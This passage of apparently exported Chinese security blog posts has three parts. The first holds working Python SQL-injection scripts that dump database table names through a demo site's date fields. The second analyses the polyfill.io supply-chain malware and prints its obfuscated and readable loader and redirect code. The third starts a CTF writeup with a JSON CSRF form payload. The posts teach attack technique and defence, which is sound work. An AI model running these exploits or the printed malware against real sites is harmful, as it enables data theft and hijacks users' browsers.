再加速：一次偷渡 n 個字剛剛的做法，其實就是把字串視為是一個 128 進位的數字，例如說 mvc，換成 ascii code 分別是 109, 119, 99，變成數字就會是 99 + 128*119 + 128*128*109 &#x3D; 1801187，也就是 180 萬天，大約是 4935 年。 理論上只要這個年份不超過程式語言可以表示的範圍，我們就能一次拿出多個字元，以 PHP 為例，我們可以寫個簡單的腳本算一下： &lt;?php $base = 1672502400; $num = 1; for($i=1; $i&lt;=10; $i++) &#123; $num *= 128; echo($i . \"\\n\"); echo(date('Y-m-d', $base + $num*86400) . \"\\n\"); &#125; ?> 輸出是： 1 2023-05-08 2 2067-11-09 3 7764-10-21 4 736974-04-25 5 94075791-06-08 6 12041444382-10-24 7 PHP Warning: date() expects parameter 2 to be int, float given in /Users/li.hu/Documents/playground/ctf/sql-injection/test.php on line 7 8 PHP Warning: date() expects parameter 2 to be int, float given in /Users/li.hu/Documents/playground/ctf/sql-injection/test.php on line 7 9 PHP Warning: date() expects parameter 2 to be int, float given in /Users/li.hu/Documents/playground/ctf/sql-injection/test.php on line 7 10 PHP Warning: date() expects parameter 2 to be int, float given in /Users/li.hu/Documents/playground/ctf/sql-injection/test.php on line 7 代表我們最多可以一次拿 5 個字元，因為 128^6 還在許可範圍之內，不會爆炸。 但是呢，Python 在使用 datetime.strptime 將日期轉為 timestamp 時，最高的上限似乎是 9999 年，超過以後就會拋錯。因此，除非自己寫一套轉換，否則最多就只能一次拿 3 個字元的資料。寫這個轉換光想就很麻煩（要考慮到每個月的天數跟閏年），因此我只實作了 3 個字元的版本，程式碼如下： # exploit-ava-3x.py import requests import datetime import json import urllib.parse import time def encode(raw): return urllib.parse.quote(raw.encode('utf8')) host = 'https://od-php.herokuapp.com/sql' base_time = 1672502400 index = 1 result = '' field = 'group_concat(table_name)' fr = \" FROM information_schema.tables WHERE table_schema != 'mysql' AND table_schema != 'information_schema'\" fr = encode(fr) start = time.time() while True: payload = f''' ascii(SUBSTRING(&#123;field&#125;,&#123;index&#125;))*86400 + ascii(SUBSTRING(&#123;field&#125;,&#123;index+1&#125;))*86400*128 + ascii(SUBSTRING(&#123;field&#125;,&#123;index+2&#125;))*86400*128*128 + &#123;base_time&#125; ''' response = requests.get(f'&#123;host&#125;/availability.php?id=12345%20union%20select%201%20,&#123;base_time&#125;,&#123;encode(payload)&#125;,4%20&#123;fr&#125;&amp;start_time=2023-01-01&amp;end_time=2023-01-01') index += 3 if response.ok: data = json.loads(response.text) d = data['events'][0]['end'] print(d) if d == '2023-01-01': break else: diff = datetime.datetime.strptime(d, \"%Y-%m-%d\").timestamp() - base_time diff = int(diff/86400) is_over = False while diff > 0: num = diff % 128 if num == 0: is_over = True break result += chr(num) diff = int((diff - num) / 128) if is_over: break print(\"current:\", result) else: print('error') break print(\"result:\", result) print(f\"time: &#123;time.time() - start&#125;s\") 跑起來的結果： 大約是 13 秒，又更快了一點。 最後的加速：善用多個日期前面我們的日期區間都只傳入了一天，所以 response 就只有一天的結果，但這個功能其實可以傳入一個日期區間，例如說如果我們傳入 2023-01-01 ~ 2023-01-05，就會拿到五天的 response： &#123; \"events\": [ &#123; \"start\": \"2021-01-01\", \"end\": \"2021-01-01\", \"status\": \"Unavailable\" &#125;, &#123; \"start\": \"2021-01-02\", \"end\": \"2021-01-02\", \"status\": \"Unavailable\" &#125;, &#123; \"start\": \"2021-01-03\", \"end\": \"2021-01-03\", \"status\": \"Unavailable\" &#125;, &#123; \"start\": \"2021-01-04\", \"end\": \"2021-01-04\", \"status\": \"Unavailable\" &#125;, &#123; \"start\": \"2021-01-05\", \"end\": \"2021-01-05\", \"status\": \"Unavailable\" &#125; ] &#125; 為了簡化 query，剛剛的 query 我們都只用到了一個日期而已，而我們知道一個日期可以傳回 3 個字元的資訊，如果我們精心設計一下 query，讓每天的回傳值都帶著 3 個字元，若是 10 天都用到，就能一次回傳 30 個字元，query 會像這樣： union select 1,1672502400, ascii(SUBSTRING(group_concat(table_name),1))*86400 + ascii(SUBSTRING(group_concat(table_name),2))*86400*128 + ascii(SUBSTRING(group_concat(table_name),3))*86400*128*128 + 1672502400 ,1 FROM information_schema.tables WHERE table_schema != 'mysql' AND table_schema != 'information_schema' union select 1,1672588800, ascii(SUBSTRING(group_concat(table_name),4))*86400 + ascii(SUBSTRING(group_concat(table_name),5))*86400*128 + ascii(SUBSTRING(group_concat(table_name),6))*86400*128*128 + 1672588800 ,1 FROM information_schema.tables WHERE table_schema != 'mysql' AND table_schema != 'information_schema' union select 1,1672675200, ascii(SUBSTRING(group_concat(table_name),7))*86400 + ascii(SUBSTRING(group_concat(table_name),8))*86400*128 + ascii(SUBSTRING(group_concat(table_name),9))*86400*128*128 + 1672675200 ,1 FROM information_schema.tables WHERE table_schema != 'mysql' AND table_schema != 'information_schema' .... 腳本如下： # exploit-ava-30x.py import requests import datetime import json import urllib.parse import time def encode(raw): return urllib.parse.quote(raw.encode('utf8')) def to_ts(raw): return datetime.datetime.strptime(raw, \"%Y-%m-%d\").timestamp() host = 'https://od-php.herokuapp.com/sql' base_time = 1672502400 index = 1 result = '' field = 'group_concat(table_name)' fr = \" FROM information_schema.tables WHERE table_schema != 'mysql' AND table_schema != 'information_schema'\" start_time = '2023-01-01' end_time = '2023-01-10' date_count = 10 fetch_per_union = 3 start = time.time() while True: unions = [] query_time = base_time for i in range(date_count): payload = f''' ascii(SUBSTRING(&#123;field&#125;,&#123;index&#125;))*86400 + ascii(SUBSTRING(&#123;field&#125;,&#123;index+1&#125;))*86400*128 + ascii(SUBSTRING(&#123;field&#125;,&#123;index+2&#125;))*86400*128*128 + &#123;query_time&#125; ''' unions.append(f'union select 1,&#123;query_time&#125;,&#123;payload&#125;,1 &#123;fr&#125;') index += fetch_per_union query_time += 86400 payload = \" \".join(unions) print(payload) response = requests.get(f'&#123;host&#125;/availability.php?id=12345%20&#123;encode(payload)&#125;&amp;start_time=&#123;start_time&#125;&amp;end_time=&#123;end_time&#125;') if not response.ok: print('error') break data = json.loads(response.text) print(data) is_finished = False for item in data['events']: diff = to_ts(item['end']) - to_ts(item['start']) diff = int(diff/86400) is_finished = False if diff == 0: is_finished = True break count = 0 while diff > 0: num = diff % 128 if num == 0: is_finished = True break count+=1 result += chr(num) diff = int((diff - num) / 128) if count != fetch_per_union: is_finished = True break if is_finished: break print(\"current:\", result) if is_finished: break print(\"result:\", result) print(f\"time: &#123;time.time() - start&#125;s\") 執行結果會長這樣，可以看到每一筆資料的 end 都攜帶了 3 個字元的資訊在裡面： 這次只用了 1 個 query，總共花了 4 秒，就得到了 30 個字元，大多數時間其實都是花在 SQL 對於 query 的處理。 結語所有範例程式碼都在這邊：https://github.com/aszx87410/demo/tree/master/sql-injection 雖然說大部分狀況可能用多執行緒就可以搞定了，但要考慮到有些 Server 可能有 rate limiting，沒辦法送這麼多 request。撇開繞過 rate limiting 不談，我認為如何讓一個 query 傳回最大的資訊量，並且減少 request 的數量這件事情滿有趣的，因此才有了這篇文章還有各式各樣的方法。 第一個案例中最後是用了三分搜降低 request 數量，第二個案例則是用了把字串轉成數字的方式，將資料偷渡到日期裡，並用多個日期來偷渡更多的字元。 另外，上面的實作中所用的 ASCII 函式有所限制，例如說如果是中文就會爆炸，這時候可以改用 ORD 或是 HEX 之類的，支援度會更好。 這些解法我認為要想到應該都不難，但最麻煩的是實作的部分，原本我其實也沒有想做的，只想在文章裡面寫一句「理論上這樣做可以更快，實作就交給大家自己來了」，但想了想覺得還是應該要做一下。 若只是想證明 SQL injection 的漏洞存在，其實做到最慢的方法就打完收工了，但我還是會好奇：「如果真的想把整個資料庫 dump 出來，怎麼做比較快？」，或許該找個時間研究一下 sqlmap，應該可以得到不少靈感。 參考資料： Comma is forbidden! No worries!! Inject in insert&#x2F;update queries without it","link":"/2022/01/19/sql-injection-in-action/"},{"title":"請儘速遠離 cdn.polyfill.io 之惡意程式碼淺析","text":"Polyfill.io 是一個能夠自動提供前端 polyfill 的服務，使用方法相當方便，只需要選擇想被 polyfill 的功能，再引入一個 JavaScript 檔案即可： &lt;script src=\"https://polyfill.io/v3/polyfill.min.js\">&lt;/script> Server 端會自動根據 user-agent 來判斷是不是需要回傳 polyfill，所以只會引入真的需要的程式碼，聽起來方便又好用。 但這幾天應該有人收到 Google Ads 的通知，說這有 security issue，這又是爲什麼呢？ Polyfill.io 的現況如果要講得更精確一點的話，有一個叫做 polyfill-service 的開源專案，可以做到我開頭講的事情，但現在很多人都懶得自己跑一個服務，因此可以偷懶直接引入他們提供的 CDN，就可以享有相同的功能。 但在今年 2 月底的時候，原本用來提供服務的網域 cdn.polyfill.io 被賣給了一間中國公司，而專案的開發者 @triblondon 也在推特上跳出來呼籲大家拿掉對 CDN 的引用，並且說他從來都沒有那個 domain 的所有權： 也有人做了一個叫做 Polykill 的網站，講述了事情的來龍去脈。與此同時，知名的 CDN 廠商 Cloudflare 與 Fastly 都提供了他們自己的 fork，讓使用者有相對來說能夠更安心的選擇。 那如果沒有選這些，繼續用 cdn.polyfill.io 的話會怎樣呢？ 惡意程式碼淺析答案是：「在某些狀況下，網站的使用者會拿到一個被加料的 JavaScript」。 這是現在進行式，我今天才剛重現出來。 在 GitHub 上有一個 issue：polyfill.io domain owner #2873 在討論這件事，在留言處有網友 @alitonium 提供了可以重現的步驟，包括： 受影響的網址 有效的 user-agent 要帶 Referer 在滿足了一些條件之後，就能夠看到被加料的回應。 我今天稍微試了一下，這是一般的回應，就是回傳正常的 polyfill 而已： 而底下是有被加料的： 很明顯可以看出後面多了一段程式碼。 如果想自己試試看的話，我的 user-agent 帶的是： Mozilla&#x2F;7.48 (iPhone15,2; U; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit&#x2F;602.1.50 (KHTML, like Gecko) Version&#x2F;10.0 Mobile&#x2F;15E148 Safari&#x2F;602.1 前面那個 Mozilla/7.48 的數字可以亂改，然後因為 GitHub 上的評論說一個 IP 似乎只會中一次，所以我嘗試用 X-Forwared-For 偽造 IP，發現似乎有效，算是一種以毒攻毒嗎？ 總之呢，IP 多換幾次，user-agent 也多換幾次之後應該就能試出來。 那後面加料的那段程式碼會做什麼？內容如下： function MqMqY(e) &#123; var t = \"\", n = (r = c1 = c2 = 0); while (n &lt; e.length) &#123; r = e.charCodeAt(n); if (r &lt; 128) &#123; t += String.fromCharCode(r); n++; &#125; else if (r > 191 &amp;&amp; r &lt; 224) &#123; c2 = e.charCodeAt(n + 1); t += String.fromCharCode(((r &amp; 31) &lt;&lt; 6) | (c2 &amp; 63)); n += 2; &#125; else &#123; c2 = e.charCodeAt(n + 1); c3 = e.charCodeAt(n + 2); t += String.fromCharCode(((r &amp; 15) &lt;&lt; 12) | ((c2 &amp; 63) &lt;&lt; 6) | (c3 &amp; 63)); n += 3; &#125; &#125; return t; &#125; function HHwbhL(e) &#123; var m = \"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=\"; var t = \"\", n, r, i, s, o, u, a, f = 0; e = e.replace(/[^A-Za-z0-9+/=]/g, \"\"); while (f &lt; e.length) &#123; s = m.indexOf(e.charAt(f++)); o = m.indexOf(e.charAt(f++)); u = m.indexOf(e.charAt(f++)); a = m.indexOf(e.charAt(f++)); n = (s &lt;&lt; 2) | (o >> 4); r = ((o &amp; 15) &lt;&lt; 4) | (u >> 2); i = ((u &amp; 3) &lt;&lt; 6) | a; t = t + String.fromCharCode(n); if (u != 64) &#123; t = t + String.fromCharCode(r); &#125; if (a != 64) &#123; t = t + String.fromCharCode(i); &#125; &#125; return MqMqY(t); &#125; eval(\"window\")[\"klodTq\"] = function () &#123; (function (u, r, w, d, f, c) &#123; var x = HHwbhL; u = decodeURIComponent(x(u.replace(new RegExp(c + \"\" + c, \"g\"), c))); (\"jQuery\"); k = r[2] + \"c\" + f[1]; (\"Flex\"); v = k + f[6]; var s = d.createElement(v + c[0] + c[1]), g = function () &#123;&#125;; s.type = \"text/javascript\"; &#123; s.onload = function () &#123; g(); &#125;; &#125; s.src = u; (\"CSS\"); d.getElementsByTagName(\"head\")[0].appendChild(s); &#125;)( \"aHR0cHM6Ly93d3cuZ29vZ2llLWFuYWl5dGljcy5jb20vZ3RhZ3MuanM=\", \"gUssQxWzjLAD\", window, document, \"DrPdgDiahyku\", \"ptsrhUDHCv\" ); &#125;; if ( !/^Mac|Win/.test(navigator.platform) &amp;&amp; document.referrer.indexOf(\".\") !== -1 ) klodTq(); 把上面直接丟到 ChatGPT 要他幫你轉成可讀性佳的程式碼，就會得到底下的結果： // Function to decode a UTF-8 string function decodeUtf8(input) &#123; let output = \"\"; let i = 0, r, c1, c2, c3; while (i &lt; input.length) &#123; r = input.charCodeAt(i); if (r &lt; 128) &#123; output += String.fromCharCode(r); i++; &#125; else if (r > 191 &amp;&amp; r &lt; 224) &#123; c2 = input.charCodeAt(i + 1); output += String.fromCharCode(((r &amp; 31) &lt;&lt; 6) | (c2 &amp; 63)); i += 2; &#125; else &#123; c2 = input.charCodeAt(i + 1); c3 = input.charCodeAt(i + 2); output += String.fromCharCode(((r &amp; 15) &lt;&lt; 12) | ((c2 &amp; 63) &lt;&lt; 6) | (c3 &amp; 63)); i += 3; &#125; &#125; return output; &#125; // Function to decode a Base64 string function decodeBase64(input) &#123; const base64Chars = \"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=\"; let output = \"\"; let i = 0, n, r, s, o, u, a; input = input.replace(/[^A-Za-z0-9+/=]/g, \"\"); while (i &lt; input.length) &#123; s = base64Chars.indexOf(input.charAt(i++)); o = base64Chars.indexOf(input.charAt(i++)); u = base64Chars.indexOf(input.charAt(i++)); a = base64Chars.indexOf(input.charAt(i++)); n = (s &lt;&lt; 2) | (o >> 4); r = ((o &amp; 15) &lt;&lt; 4) | (u >> 2); let iChar = ((u &amp; 3) &lt;&lt; 6) | a; output += String.fromCharCode(n); if (u != 64) &#123; output += String.fromCharCode(r); &#125; if (a != 64) &#123; output += String.fromCharCode(iChar); &#125; &#125; return decodeUtf8(output); &#125; // Function to load a JavaScript file dynamically function loadScript() &#123; (function (encodedUrl, randomString, window, document, randomString2, separator) &#123; const decode = decodeBase64; const decodedUrl = decodeURIComponent(decode(encodedUrl.replace(new RegExp(separator + separator, \"g\"), separator))); const scriptId = randomString[2] + \"c\" + randomString2[1] + randomString2[6]; const scriptElement = document.createElement(scriptId + separator[0] + separator[1]); const noop = function () &#123;&#125;; scriptElement.type = \"text/javascript\"; scriptElement.onload = noop; scriptElement.src = decodedUrl; document.getElementsByTagName(\"head\")[0].appendChild(scriptElement); &#125;)( \"aHR0cHM6Ly93d3cuZ29vZ2llLWFuYWl5dGljcy5jb20vZ3RhZ3MuanM=\", \"gUssQxWzjLAD\", window, document, \"DrPdgDiahyku\", \"ptsrhUDHCv\" ); &#125; // Automatically execute the script loading function if the platform is not Mac or Win and the referrer is valid if (!/^Mac|Win/.test(navigator.platform) &amp;&amp; document.referrer.indexOf(\".\") !== -1) &#123; loadScript(); &#125; 在 Mac 跟 Windows 上，而且有帶 referrer 的網頁才會觸發，會去載入一個 script，而 script 的 src 是 aHR0cHM6Ly93d3cuZ29vZ2llLWFuYWl5dGljcy5jb20vZ3RhZ3MuanM= base64 解碼之後的結果： https:&#x2F;&#x2F;www.googie-anaiytics.com&#x2F;gtags.js 乍看之下會想說：「這不就是 Google Analytics 嗎？有什麼特別？」，但更仔細看，會看到 googie 跟 anaiytics 這些偽裝的單字，顯然是個惡意 domain。 而這個檔案裡的程式碼理所當然經過了混淆： 但因為不太用心，是找現成工具做的，所以我們可以用其他現成工具來還原： https://obf-io.deobfuscate.io/ https://deobfuscate.relative.im/ 可以還原成底下可讀性好了不少的形式，至少有些字串可以看： function loadJS(_0x1fa6fb, _0x1802b4) &#123; var _0x70d7c = document.createElement('script'), _0x505482 = _0x1802b4 || function () &#123;&#125; _0x70d7c.type = 'text/javascript' &#123; _0x70d7c.onload = function () &#123; _0x505482() &#125; &#125; _0x70d7c.src = _0x1fa6fb document.getElementsByTagName('head')[0].appendChild(_0x70d7c) &#125; function isPc() &#123; try &#123; var _0x4ed75f = navigator.platform == 'Win32' || navigator.platform == 'Windows', _0x3f80bf = navigator.platform == 'Mac68K' || navigator.platform == 'MacPPC' || navigator.platform == 'Macintosh' || navigator.platform == 'MacIntel' if (_0x3f80bf || _0x4ed75f) &#123; return true &#125; else &#123; return false &#125; &#125; catch (_0x1793fe) &#123; return false &#125; &#125; function checkKeywords(_0x3ab08e) &#123; const _0x18dd4d = document.documentElement.innerHTML let _0x3cdba9 = false for (const _0xda2c7 of _0x3ab08e) &#123; if (_0x18dd4d.indexOf(_0xda2c7) !== -1) &#123; _0x3cdba9 = true const _0xd85bed = _0x18dd4d.indexOf(_0xda2c7), _0x267743 = _0x18dd4d.substring(_0xd85bed - 20, _0xd85bed + 20) break &#125; &#125; return _0x3cdba9 &#125; function vfed_update(_0x2723e2) &#123; fetch('https://www.googie-anaiytics.com/keywords/vn-keyword.json') .then((_0x1204ac) => _0x1204ac.json()) .then((_0x318df9) => &#123; const _0x3d6056 = checkKeywords(_0x318df9) _0x3d6056 &amp;&amp; _0x2723e2 !== '' &amp;&amp; loadJS( 'https://www.googie-anaiytics.com/html/checkcachehw.js?origin=kwvnn', function () &#123; if (usercache == true) &#123; window.location.href = _0x2723e2 &#125; &#125; ) &#125;) .catch((_0x2c91ce) => console.error('Error fetching the JSON file:', _0x2c91ce) ) &#125; function check_tiaozhuan() &#123; const _0x464cf7 = (function () &#123; let _0x2ddab7 = true return function (_0x15452, _0x3e7ea8) &#123; const _0x2faa6e = &#123; bjeMJ: function (_0x15a8ac, _0xefecf2) &#123; return _0x15a8ac(_0xefecf2) &#125;, pqiqW: function (_0x50e73a, _0x158536) &#123; return _0x50e73a !== _0x158536 &#125;, zbtQp: function (_0x1dfdda, _0x1aa046, _0x3b4d3c) &#123; return _0x1dfdda(_0x1aa046, _0x3b4d3c) &#125;, volhE: 'https://www.googie-anaiytics.com/html/checkcachehw.js?origin=kwvnn', OBmcC: function (_0x598542, _0x5a0037) &#123; return _0x598542 == _0x5a0037 &#125;, IzGuE: function (_0x193bad, _0x38f83f) &#123; return _0x193bad &lt;= _0x38f83f &#125;, MctlV: function (_0x4cf969, _0x3f5292) &#123; return _0x4cf969 === _0x3f5292 &#125;, NiqyK: 'mcNrr', HANcJ: 'QRUUg', pgwSI: function (_0x26a5c9, _0x345245) &#123; return _0x26a5c9 !== _0x345245 &#125;, XaDFm: 'iuHAU', &#125; const _0x1c444b = _0x2ddab7 ? function () &#123; if (_0x2faa6e.MctlV(_0x2faa6e.NiqyK, _0x2faa6e.HANcJ)) &#123; const _0x180d73 = _0x2faa6e.bjeMJ(_0x3eaf18, _0x2bb07f) _0x180d73 &amp;&amp; _0x2faa6e.pqiqW(_0x4742d9, '') &amp;&amp; _0x2faa6e.zbtQp(_0x955e25, _0x2faa6e.volhE, function () &#123; _0x2faa6e.OBmcC(_0x4eb5f8, true) &amp;&amp; (_0x94c0a4.location.href = _0x1dbf3a) &#125;) &#125; else &#123; if (_0x3e7ea8) &#123; if (_0x2faa6e.pgwSI(_0x2faa6e.XaDFm, _0x2faa6e.XaDFm)) &#123; _0x2faa6e.IzGuE(_0x51047d, 10) &amp;&amp; (_0x391f84 = _0x40837e) &#125; else &#123; const _0x47d725 = _0x3e7ea8.apply(_0x15452, arguments) return (_0x3e7ea8 = null), _0x47d725 &#125; &#125; &#125; &#125; : function () &#123;&#125; return (_0x2ddab7 = false), _0x1c444b &#125; &#125;)(), _0x41d32e = _0x464cf7(this, function () &#123; return _0x41d32e .toString() .search('(((.+)+)+)+$') .toString() .constructor(_0x41d32e) .search('(((.+)+)+)+$') &#125;) _0x41d32e() var _0x112e13 = navigator.userAgent.match( /(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i ) if (_0x112e13) &#123; var _0x152838 = window.location.host, _0xc3b985 = document.referrer, _0x56bd89 = '', _0x42c985 = 'https://wweeza.com/redirect?from=bitget', _0x57dc62 = Math.floor(Math.random() * 100 + 1), _0x5462a8 = new Date(), _0x394b64 = _0x5462a8.getHours() if ( _0x152838.indexOf('www.dxtv1.com') !== -1 || _0x152838.indexOf('www.ys752.com') !== -1 ) &#123; _0x56bd89 = 'https://wweeza.com/redirect?from=bitget' &#125; else &#123; if (_0x152838.indexOf('shuanshu.com.com') !== -1) &#123; _0x56bd89 = 'https://wweeza.com/redirect?from=bitget' &#125; else &#123; if ( _0xc3b985.indexOf('.') !== -1 &amp;&amp; _0xc3b985.indexOf(_0x152838) == -1 ) &#123; _0x56bd89 = 'https://wweeza.com/redirect?from=bitget' &#125; else &#123; if (_0x394b64 >= 0 &amp;&amp; _0x394b64 &lt; 2) &#123; _0x57dc62 &lt;= 10 &amp;&amp; (_0x56bd89 = _0x42c985) &#125; else &#123; if (_0x394b64 >= 2 &amp;&amp; _0x394b64 &lt; 4) &#123; _0x57dc62 &lt;= 15 &amp;&amp; (_0x56bd89 = _0x42c985) &#125; else &#123; if (_0x394b64 >= 4 &amp;&amp; _0x394b64 &lt; 7) &#123; _0x57dc62 &lt;= 20 &amp;&amp; (_0x56bd89 = _0x42c985) &#125; else &#123; if (_0x394b64 >= 7 &amp;&amp; _0x394b64 &lt; 8) &#123; if (_0x57dc62 &lt;= 10) &#123; _0x56bd89 = _0x42c985 &#125; &#125; else &#123; _0x57dc62 &lt;= 10 &amp;&amp; (_0x56bd89 = _0x42c985) &#125; &#125; &#125; &#125; &#125; &#125; &#125; _0x56bd89 != '' &amp;&amp; !isPc() &amp;&amp; document.cookie.indexOf('admin_id') == -1 &amp;&amp; document.cookie.indexOf('adminlevels') == -1 &amp;&amp; vfed_update(_0x56bd89) &#125; &#125; let tsastr = document.documentElement.outerHTML, bdtjfg = tsastr.indexOf('hm.baidu.com') != -1, cnzfg = tsastr.indexOf('.cnzz.com') != -1, wolafg = tsastr.indexOf('.51.la') != -1 let mattoo = tsastr.indexOf('.matomo.org') != -1, aanaly = tsastr.indexOf('.google-analytics.com') != -1, ggmana = tsastr.indexOf('.googletagmanager.com') != -1, aplausix = tsastr.indexOf('.plausible.io') != -1 let statcct = tsastr.indexOf('.statcounter.com') != -1 bdtjfg || cnzfg || wolafg || mattoo || aanaly || ggmana || aplausix || statcct ? setTimeout(check_tiaozhuan, 2000) : check_tiaozhuan() 這時候就要再次交給 ChatGPT 大神，不需要什麼高深的 prompt，只要跟他說把它可讀性變好就行，就可以得到底下的結果： // Function to load a JavaScript file dynamically and execute a callback once it's loaded function loadJS(url, callback) &#123; const script = document.createElement('script'); const onLoadCallback = callback || function () &#123;&#125;; script.type = 'text/javascript'; script.onload = onLoadCallback; script.src = url; document.getElementsByTagName('head')[0].appendChild(script); &#125; // Function to determine if the current device is a PC function isPc() &#123; try &#123; const isWindows = navigator.platform === 'Win32' || navigator.platform === 'Windows'; const isMac = ['Mac68K', 'MacPPC', 'Macintosh', 'MacIntel'].includes(navigator.platform); return isWindows || isMac; &#125; catch (error) &#123; return false; &#125; &#125; // Function to check if any of the provided keywords exist in the document's HTML function checkKeywords(keywords) &#123; const htmlContent = document.documentElement.innerHTML; for (const keyword of keywords) &#123; if (htmlContent.includes(keyword)) &#123; return true; &#125; &#125; return false; &#125; // Function to fetch keyword data and update the page if keywords match function vfed_update(redirectUrl) &#123; fetch('https://www.googie-anaiytics.com/keywords/vn-keyword.json') .then(response => response.json()) .then(keywords => &#123; const keywordsFound = checkKeywords(keywords); if (keywordsFound &amp;&amp; redirectUrl) &#123; loadJS('https://www.googie-anaiytics.com/html/checkcachehw.js?origin=kwvnn', function () &#123; if (window.usercache === true) &#123; window.location.href = redirectUrl; &#125; &#125;); &#125; &#125;) .catch(error => console.error('Error fetching the JSON file:', error)); &#125; // Function to handle page redirection based on certain conditions function check_tiaozhuan() &#123; if (navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i)) &#123; const host = window.location.host; const referrer = document.referrer; const redirectBaseUrl = 'https://wweeza.com/redirect?from=bitget'; const currentHour = new Date().getHours(); let redirectUrl = ''; if (['www.dxtv1.com', 'www.ys752.com', 'shuanshu.com.com'].includes(host) || (referrer.includes('.') &amp;&amp; !referrer.includes(host))) &#123; redirectUrl = redirectBaseUrl; &#125; else if (currentHour >= 0 &amp;&amp; currentHour &lt; 2 &amp;&amp; Math.random() * 100 + 1 &lt;= 10) &#123; redirectUrl = redirectBaseUrl; &#125; else if (currentHour >= 2 &amp;&amp; currentHour &lt; 4 &amp;&amp; Math.random() * 100 + 1 &lt;= 15) &#123; redirectUrl = redirectBaseUrl; &#125; else if (currentHour >= 4 &amp;&amp; currentHour &lt; 7 &amp;&amp; Math.random() * 100 + 1 &lt;= 20) &#123; redirectUrl = redirectBaseUrl; &#125; else if (currentHour >= 7 &amp;&amp; currentHour &lt; 8 &amp;&amp; Math.random() * 100 + 1 &lt;= 10) &#123; redirectUrl = redirectBaseUrl; &#125; else if (currentHour >= 8 &amp;&amp; Math.random() * 100 + 1 &lt;= 10) &#123; redirectUrl = redirectBaseUrl; &#125; if (redirectUrl &amp;&amp; !isPc() &amp;&amp; !document.cookie.includes('admin_id') &amp;&amp; !document.cookie.includes('adminlevels')) &#123; vfed_update(redirectUrl); &#125; &#125; &#125; // Check for certain analytics tools in the document and trigger redirection logic accordingly const htmlContent = document.documentElement.outerHTML; const analyticsTools = ['hm.baidu.com', '.cnzz.com', '.51.la', '.matomo.org', '.google-analytics.com', '.googletagmanager.com', '.plausible.io', '.statcounter.com']; const analyticsFound = analyticsTools.some(tool => htmlContent.includes(tool)); if (analyticsFound) &#123; setTimeout(check_tiaozhuan, 2000); &#125; else &#123; check_tiaozhuan(); &#125; 函式名稱叫做 check_tiaozhuan（檢查跳轉），直接用中文變數名稱不演了。 總之呢，做了許多檢查之後，最後會把你導到一個越南的網站，看起來是運動賽事賭博的那種。 因此呢，如果你的網站上有引入到 cdn.polyfill.io 的程式碼，請立刻拿掉，否則有些使用者就會莫名其妙地被導到其他網站去。而且，我也不能保證反混淆跟 ChatGPT 還原出來的結果一定正確，都已經可以執行 JavaScript 做供應鏈攻擊了，它能做的事情其實更多，如果有人跟我說他還有偷拿 cookie 或是 localStorage 什麼的，這我也會相信（但目前的程式碼沒看到）。 未來該如何防禦？先聲明一下，之所以會有資安問題，並不是 polyfill service 本身的錯，它是無辜的，如果你想繼續用的話，可以自己架一個，這完全沒有問題。問題是出在「引入了惡意網域 cdn.polyfill.io 的 JavaScript」這件事情上面。 引入第三方套件本來就會造成一些資安上的風險，更別提是像這種直接往 CDN 拿的，風險就更高了。 最好的防禦就是：不要用。 不管是來路不明的 cdn.polyfill.io 還是老牌的 cdnjs，全部都不要用，因為用了就是有風險。就算連 cdnjs 都有風險，詳情可參考：從 cdnjs 的漏洞來看前端的供應鏈攻擊與防禦。 如果真的一定要用，記得加上 integrity 屬性，它能保證 response 如果被篡改了，就不會被載入，多了一層防禦。 但像是 cdn.polyfill.io 這種原本就是動態內容的就沒辦法了，因為 integrity 只能針對固定的內容。 所以如果可以的話，盡量不要用這些第三方的套件。 話說有不少人用的 Disqus 其實也幹過這種事，詳情可以參考：Disqus is Evil Trash 🗑","link":"/2024/06/25/stop-using-polyfill-io/"},{"title":"SUSCTF 2022 Writeup","text":"這個假日有不少 CTF，跟著隊伍 SU 一起打了 SUSCTF 2022，這篇簡單記錄一下幾個我有參與的題目的心得。 會講到的題目列表如下： web&#x2F;fxxkcors web&#x2F;ez_note web&#x2F;baby gadget v1.0 web&#x2F;baby gadget v1.0’s rrrevenge web&#x2F;HTML practice web&#x2F;fxxkcors (67 solves) 這題就是有一個 change.php 可以讓你改權限，把自己權限改成 admin 就可以看到 flag 了，request 長得像這樣： POST &#x2F;changeapi.php HTTP&#x2F;1.1 Host: 124.71.205.122:10002 Content-Length: 19 Accept: application&#x2F;json, text&#x2F;plain, *&#x2F;* Accept-Language: zh-CN,zh;q&#x3D;0.8,en-US;q&#x3D;0.5,en;q&#x3D;0.3 User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;98.0.4758.82 Safari&#x2F;537.36 Content-Type: application&#x2F;json; charset&#x3D;UTF-8 Origin: http:&#x2F;&#x2F;124.71.205.122:10002 Referer: http:&#x2F;&#x2F;124.71.205.122:10002&#x2F;change.php Accept-Encoding: gzip, deflate Cookie: PHPSESSID&#x3D;1ab6387f551b235d26d1c88a3685d752 Connection: close &#123;&quot;username&quot;:&quot;huli&quot;&#125; 但你自己當然沒權限去改，所以這提供了一個 admin bot，你可以給他任意網址讓他去造訪，因此目標顯而易見就是讓 admin bot 幫你 request 去改權限。 可是你是從不同的 origin 發 request 的，而且還要帶上 cookie，所以會在 CORS 那關被擋掉。 這時候就要來 CSRF 了，但是要求的格式是 JSON，該怎麼 CSRF 呢？有一個我以前看到不少次的技巧，如果 server 沒有特別檢查 content type 的話，可以像這樣做： &lt;body> &lt;form id=a action=\"http://124.71.205.122:10002/changeapi.php\" method=\"POST\" enctype=\"text/plain\"> &lt;input name='&#123;\"username\":\"huli\", \"abc\":\"' value='123\"&#125;'> &lt;/form> &lt;script> a.submit() &lt;/script> &lt;/body> 因為 POST 其實就是把 request body 變成 &#123;key&#125;=&#123;value&#125;，所以上面的表單會是 &#123;&quot;username&quot;:&quot;huli&quot;, 